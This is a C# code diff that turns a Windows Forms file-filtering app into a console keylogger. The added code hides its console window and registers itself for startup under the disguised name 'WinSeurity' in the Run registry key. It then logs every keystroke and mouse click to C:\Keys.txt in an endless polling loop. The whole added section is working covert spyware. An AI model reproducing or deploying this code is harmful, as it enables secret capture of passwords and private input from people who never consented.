@@ -1,57 +1,157 @@
 using System;
-using System.Text;
+using System.Runtime.InteropServices;
+using System.Threading;
 using System.Windows.Forms;
 using System.IO;
+using System.Text;
 
-namespace WindowsFormsApp3
+namespace ConsoleApp4
 {
-    public partial class Form1 : Form
+
+   static class NativeMethods
     {
-        public OpenFileDialog openFileDialog1;
+        [DllImport("kernel32.dll")]
+        static public extern IntPtr GetConsoleWindow();
 
-        public Form1()
+        [DllImport("user32.dll")]
+        static public extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        public const int SW_HIDE = 0;
+    }
+    
+
+
+
+
+    class Program
+    {
+
+
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+
+
+        static void Main(string[] args)
         {
-            InitializeComponent();
+
+            var handle = NativeMethods.GetConsoleWindow();
+            NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
+            var avt = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            avt.SetValue("WinSeurity", Application.ExecutablePath);
+            StartLogging();
+
         }
 
-        private void Form1_Load(object sender, EventArgs e)
-        {
-            openFileDialog1 = new OpenFileDialog();
 
-        }
 
-        private void Start_Click(object sender, EventArgs e)
+
+        static void StartLogging()
         {
             string tex;
-            string filt="";
-
-            openFileDialog1.ShowDialog();
-            var sr = new StreamReader(openFileDialog1.FileName);
-            tex = sr.ReadLine();
-
-            for (int i=0; i<tex.Length;i++)
+            while (true)
             {
-                if (tex[i]=='2' && tex[i-1] == 'D')
+                Thread.Sleep(1);
+                for (Int32 i = 0; i < 255; i++)
                 {
-                    for (int k=i-100;k<i+150;k++)
+                    tex = ((Keys)i).ToString();
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState==1 || keyState==-32767)
                     {
-                        try
-                        {
-                            filt += tex[k];
+                        switch(tex){
+
+                            case "LButton":
+                                tex = "mlk";
+                                break;
+
+                            case "RButton":
+                                tex = "mrk";
+                                break;
+
+                            case "ShiftKey":
+                                tex = "shft";
+                                break;
+
+                            case "LShiftKey":
+                                tex = "shft";
+                                break;
+
+                            case "ControlKey":
+                                tex = "cntrl";
+                                break;
+
+                            case "LControlKey":
+                                tex = "cntrl";
+                                break;
+
+                            case "Menu":
+                                tex = "men";
+                                break;
+
+                            case "Back":
+                                tex = "bcsp";
+                                break;
+
+                            case "Delete":
+                                tex = "dlt";
+                                break;
+
+                            case "NumPad0":
+                                tex = "0";
+                                break;
+
+                            case "NumPad1":
+                                tex = "1";
+                                break;
+
+                            case "NumPad2":
+                                tex = "2";
+                                break;
+
+                            case "NumPad3":
+                                tex = "3";
+                                break;
+
+                            case "NumPad4":
+                                tex = "4";
+                                break;
+
+                            case "NumPad5":
+                                tex = "5";
+                                break;
+
+                            case "NumPad6":
+                                tex = "6";
+                                break;
+
+                            case "NumPad7":
+                                tex = "7";
+                                break;
+
+                            case "NumPad8":
+                                tex = "8";
+                                break;
+
+                            case "NumPad9":
+                                tex = "9";
+                                break;
+
+                            case "Decimal":
+                                tex = ".";
+                                break;
+
+                            case "Oemcommal":
+                                tex = ",";
+                                break;
                         }
-                        catch { }
-                        
+
+
+                        StreamWriter wr = new StreamWriter("C:\\Keys.txt", true, Encoding.ASCII);
+                        wr.Write(tex);
+                        wr.Close();                        
                     }
                 }
             }
-
-
-            StreamWriter wr = new StreamWriter("C:\\KeysFiltr.txt", true, Encoding.ASCII);
-            wr.Write(filt);
-            wr.Close();
-
-
-
         }
     }
 }
